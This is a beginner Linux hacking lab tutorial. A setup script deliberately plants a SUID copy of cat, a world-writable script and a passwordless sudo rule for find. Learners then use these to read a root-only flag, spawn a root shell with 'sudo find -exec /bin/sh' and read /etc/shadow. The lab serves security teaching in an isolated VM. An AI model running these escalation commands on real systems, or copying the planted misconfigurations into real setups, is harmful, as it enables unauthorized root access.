# Lab: Linux Fundamentals for Hackers – Navigate, Manipulate, Escalate

**Difficulty:** Beginner
**Category:** Linux
**Builds On:** None – standalone entry point

*"Most servers and hacking tools run on Linux. Navigating the shell, working with files, and managing permissions are absolute must-haves."*

This hands-on lab turns that statement into practice. You'll explore a simulated compromised server, hunt for hidden treasures, analyse logs, and abuse misconfigured permissions to read a secret flag — exactly the skills every cyber security professional needs.

---

## Lab Overview

**Storyline**
You've gained a foothold on a Linux server as a low-privileged user. Your mission is to perform basic reconnaissance, locate sensitive information, and find a way to read a root-protected flag.

**Learning Objectives**
- Move around the file system (`pwd`, `ls`, `cd`, `find`)
- Inspect files and hidden content (`cat`, `less`, `grep`, `ls -la`)
- Understand Linux permissions (`ls -l`, `chmod`, `chown`, SUID)
- Use world-writable files and SUID binaries to escalate privileges
- (Bonus) Exploit a sudo misconfiguration

**Time**
30–45 minutes

---

## Safety & Isolation Notice

> **Run this only in an isolated VM or snapshot** (Ubuntu 20.04/22.04 or Kali recommended).
> Do not run on your daily driver or any machine with sensitive data.
> This lab only touches local files and permissions — no network exposure — but isolation is still required since it creates a user account and a sudoers entry on the system.

---

## Prerequisites


> **New to virtual machines?** Follow the [VM setup guide](https://threatroad.com/vm-setup) before continuing. It covers installation, isolation, snapshots, and troubleshooting.

- **A dedicated virtual machine** – Ubuntu 20.04/22.04 or Kali Linux (Debian/Ubuntu-based; the setup uses `useradd`, `chpasswd`, and `/bin/cat`). **Do not run this on your daily driver.**
- The VM should have a user with `sudo` access (you'll use it to set up the lab).
- Basic comfort with a terminal.
- Single VM, no additional tools required.

---

## Step 1: Lab Setup (run once, as root)

> **Download instead of copy/paste:** [Download the setup script](downloads/lab01-setup.sh). Save it inside the VM and run `sudo bash ~/Downloads/lab01-setup.sh`. Re-run the same file whenever you need to reset the lesson.


Copy the script below, save it as `lab_setup.sh`, and execute it with `sudo bash lab_setup.sh`.
It creates a vulnerable playground under `/opt/linux_lab` and a dedicated low-privileged user `labuser`.

> **Re-running this script resets the lab to a clean state.** Any progress you made in the lab directory is wiped and recreated.

```bash
#!/bin/bash
# linux-fundamentals-lab-setup.sh
# Run as root: sudo bash lab_setup.sh
set -e

if [ "$(id -u)" -ne 0 ]; then
  echo "[-] Run this setup as root." >&2
  exit 1
fi

# --- 1. (Re)create restricted user ---
userdel -r labuser 2>/dev/null || true
useradd -m -s /bin/bash labuser
echo 'labuser:labpassword' | chpasswd

# --- 2. Wipe and recreate the lab directory ---
LAB=/opt/linux_lab
rm -rf "$LAB"
mkdir -p "$LAB/sensitive_data" "$LAB/logs" "$LAB/scripts" "$LAB/.hidden"
chown -R root:root "$LAB"
chmod 755 "$LAB"

# --- 3. Note for the student ---
cat > "$LAB/note.txt" <<'EOF'
Welcome, rookie.
Your task: explore this server.
Look for hidden files, misconfigured permissions, and a way to read the secret flag.
Good luck!
EOF
chmod 644 "$LAB/note.txt"

# --- 4. Hidden directory with a clue ---
echo "You found a hidden clue! Now look for a secret file that only root can read... maybe a special binary can help?" > "$LAB/.hidden/treasure.txt"
chmod 644 "$LAB/.hidden/treasure.txt"

# --- 5. sensitive_data directory ---
echo "Public readme - nothing special." > "$LAB/sensitive_data/readme.txt"
echo "API_KEY=supersecretapikey" > "$LAB/sensitive_data/secrets.cfg"
chmod 640 "$LAB/sensitive_data/secrets.cfg"   # group=root, so labuser cannot read it

# --- 6. World-writable script (teaching example; never executed by this lab) ---
printf '#!/bin/bash\necho "Cleanup script - if root runs me, I could be dangerous..."\n' > "$LAB/scripts/cleanup.sh"
chmod 666 "$LAB/scripts/cleanup.sh"

# --- 7. SUID binary (safe copy of cat) ---
cp /bin/cat "$LAB/read_secret"
chmod 4755 "$LAB/read_secret"

# --- 8. The secret flag (root-only). Encoded so students can't grep the setup script ---
# Encoded form of FLAG{...}
echo 'RkxBR3tTVUlEX21lYW5zX1N1cGVyVXNlcklEfQ==' > "$LAB/.secret_flag.enc"
chmod 400 "$LAB/.secret_flag.enc"

# --- 9. Fake log file with leaked password ---
cat > "$LAB/logs/auth.log" <<'EOF'
Jun 29 10:23:15 server sshd[1234]: Failed password for admin from 192.168.1.100 port 22 ssh2: password='P@ssw0rd123'
Jun 29 10:23:18 server sshd[1234]: Connection closed by authenticating user admin 192.168.1.100 port 22 [preauth]
EOF
chmod 644 "$LAB/logs/auth.log"

# --- 10. Sudo misconfiguration for bonus task ---
echo "labuser ALL=(ALL) NOPASSWD: /usr/bin/find" > /etc/sudoers.d/labuser
chmod 440 /etc/sudoers.d/labuser

# --- 10b. Bonus hint (only root can read /root, so this proves root access) ---
cat > /root/.bonus_hint <<EOF
You made it to root. The bonus flag is:
$(printf '%s' 'RkxBR3tzdWRvX21lYW5zX3N1X0RPX0JPTlVTfQ==' | base64 -d)
EOF
chmod 600 /root/.bonus_hint

# --- 11. submit_flag helper: installed once, available to every user via /etc/profile.d ---
# Expected flags are decoded at runtime from base64 so they cannot be grepped in clear.
cat > /etc/profile.d/threatroad_lab1_submit_flag.sh <<'EOF'
# Auto-generated by lab_setup.sh
submit_flag() {
  local sub="$1"
  local submitted_digest
  submitted_digest=$(printf '%s' "$sub" | sha256sum | awk '{print $1}')
  local expected_main expected_bonus
  expected_main='71fea84e9c9bd6c88b621a9c6e24f1ece7f0ee911c0ce6920b1b28c909c211a2'
  expected_bonus='75e12de1035b8ed12e54e3c906bce2faf0826233004142ba2d0181f72fbe3d27'
  if [ "$submitted_digest" = "$expected_main" ]; then
    echo -e "\033[32m[+] Correct! Task 4 flag verified.\033[0m"
    return 0
  elif [ "$submitted_digest" = "$expected_bonus" ]; then
    echo -e "\033[32m[+] Correct! Bonus flag verified - you crushed it.\033[0m"
    return 0
  else
    echo -e "\033[31m[-] Not quite. Capture the real flag and try again.\033[0m"
    return 1
  fi
}
EOF
chmod 644 /etc/profile.d/threatroad_lab1_submit_flag.sh

echo "[+] Lab environment ready under $LAB"
echo "[+] Switch to user 'labuser' with:  su - labuser   (password: labpassword)"
```

After the script finishes, **switch to the lab user** so its shell sources `submit_flag.sh` automatically:

```bash
su - labuser
```

You are now the "attacker" with minimal privileges. The `submit_flag <FLAG{...}>` command will be available in every new shell opened from here.

---

## Step 2: Hands-On Tasks

**Task 1 – File System Reconnaissance**
Get a feel for the environment.

```bash
pwd                          # where am I?
cd /opt/linux_lab            # move to the lab
ls                           # what's here?
ls -la                       # aha! hidden files appear
cd .hidden && cat treasure.txt   # read the clue
```

> **You've learned:** `ls -a` shows hidden dot-files, `cat` prints file content.

---

**Task 2 – Permission Inspection**
Not all files are created equal. Find out which ones you can actually read or write.

```bash
cd /opt/linux_lab/sensitive_data
ls -l
cat readme.txt               # success
cat secrets.cfg              # Permission denied
find /opt/linux_lab -type f -perm -o+w   # find world-writable files
```

The `ls -l` output shows `secrets.cfg` with the mask `-rw-r-----`. The owner and group are both `root` (set by the setup script), and `labuser` is neither — so even though "others" have no permissions, you still can't read it because you're *outside* the access triangle entirely. That's an important distinction: **mode 640 with group=root is the same wall as mode 600 to any non-root user.**

You'll also see `/opt/linux_lab/scripts/cleanup.sh` is writable by anyone. *In a real engagement, a world-writable script that is executed by a privileged user (cron, root) could be overwritten to gain a shell.*
*This teaching example is never executed by the lab, so overwriting it is harmless here.*

> **You've learned:** `ls -l` decodes permissions as owner/group/others; `find -perm -o+w` locates insecure world-writable files.

---

**Task 3 – Log Analysis with `grep`**
Sensitive data often leaks into logs.

```bash
grep -i password /opt/linux_lab/logs/auth.log
```

Output:
`Failed password for admin … password='P@ssw0rd123'`

Clear-text passwords in logs are a goldmine for an attacker.

> **You've learned:** `grep` searches text; `-i` makes it case-insensitive.

---

**Task 4 – SUID Privilege Escalation**
SUID binaries run with the owner's permissions. Let's find and abuse one.

```bash
find /opt/linux_lab -type f -perm -4000 -ls
# You'll spot /opt/linux_lab/read_secret (owned by root, SUID bit set)
ls -ld /opt/linux_lab/.secret_flag.enc       # -r-------- 1 root root … root-only file
/opt/linux_lab/read_secret /opt/linux_lab/.secret_flag.enc | base64 -d
```

Boom! The flag appears: `FLAG{...}`

The SUID binary runs as root, so it *can* read the encoded flag file — and `base64 -d` decodes it on the spot. Submit it to confirm your capture:

```bash
submit_flag 'FLAG{...}'
```

Expected output: `[+] Correct! Task 4 flag verified.`

> **You've learned:** The SUID bit (chmod u+s) lets a binary run with the file owner's rights. A simple `cat` copy can be enough to read protected data — and a one-line `submit_flag` proves you got it.

---

**Task 5 – BONUS: Sudo Misconfiguration**
Still as `labuser`, check your sudo privileges:

```bash
sudo -l
```

Output shows: `(root) NOPASSWD: /usr/bin/find`
This means you can run `find` as root without a password. Using [GTFOBins](https://gtfobins.github.io/gtfobins/find/):

```bash
sudo find /opt/linux_lab -name nothing -exec /bin/sh \; -quit
```

You now have a **root shell**. The bonus flag isn't a file on disk — it's a hidden one you can mint by proving root. Try reading the normally-forbidden `/etc/shadow` to confirm you're truly root, then look in root's home for a bonus hint:

```bash
head -1 /etc/shadow        # confirms you're root (unreadable as labuser)
cat /root/.bonus_hint      # a file only root could see; read it for the bonus flag
```

The hint reveals the bonus flag value. Submit it:

```bash
submit_flag 'FLAG{...}'
```

Expected output: `[+] Correct! Bonus flag verified - you crushed it.`

Type `exit` to return to the labuser session.

> **You've learned:** Even a single trusted command in sudoers can lead to full system compromise. Always audit `sudo` rules!

---

## Step 3: Cleanup (when you're done)

> **Download:** [Download the cleanup script](downloads/lab01-cleanup.sh). Save it inside the VM and run `sudo bash ~/Downloads/lab01-cleanup.sh` when you are finished.


Run this script as your normal sudo-capable user (not `labuser`) to remove the lab completely:

```bash
#!/bin/bash
# linux-fundamentals-lab-cleanup.sh
set -e
sudo rm -rf /opt/linux_lab
sudo userdel -r labuser 2>/dev/null || true   # tolerate root-owned files in the home dir
sudo rm -f /etc/sudoers.d/labuser
sudo rm -f /root/.bonus_hint
sudo rm -f /etc/profile.d/threatroad_lab1_submit_flag.sh
echo "[+] Lab removed. All artifacts cleaned."
```

---

## Why This Matters

Every technique you just practiced — navigating directories, reading files, checking permissions, spotting SUID binaries, and abusing weak configurations — is daily bread for a penetration tester, SOC analyst, or forensic investigator. **Linux isn't just "nice to know"; it's the operating system that runs the internet's infrastructure and every major security tool.**

Master these fundamentals, and you'll be able to confidently move to advanced topics like shell scripting, network scanning, and exploitation frameworks.

---

---
